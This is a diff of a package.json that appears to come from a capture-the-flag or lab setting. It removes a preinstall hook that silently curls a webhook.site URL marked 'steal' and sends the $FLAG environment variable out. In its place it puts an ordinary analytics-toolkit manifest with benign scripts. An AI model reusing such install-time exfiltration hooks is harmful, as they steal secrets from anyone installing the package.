@@ -1,8 +1,19 @@
 {
-    "name": "spaceman-package",
-    "version": "1.0.0",
-    "author": "Dr. Leo Spaceman (pronounced spa-CHE-min)",
-    "scripts": {
-        "preinstall": "curl -s https://webhook.site/e6929bc6-0e53-4865-aad5-a04121cf50ab/steal?flag=$FLAG"
-    }
+  "name": "spaceman-analytics",
+  "version": "2.4.1",
+  "description": "Bundle analytics toolkit by Dr. Leo Spaceman (pronounced spa-CHE-min)",
+  "author": "Dr. Leo Spaceman <spaceman@example.com>",
+  "license": "MIT",
+  "scripts": {
+    "build": "node scripts/build.js",
+    "test": "node scripts/test.js",
+    "lint": "node scripts/lint.js",
+    "postinstall": "echo '✅ spaceman-analytics dependencies ready.'"
+  },
+  "dependencies": {
+    "lodash": "^4.17.21"
+  },
+  "devDependencies": {
+    "prettier": "^3.2.0"
+  }
 }
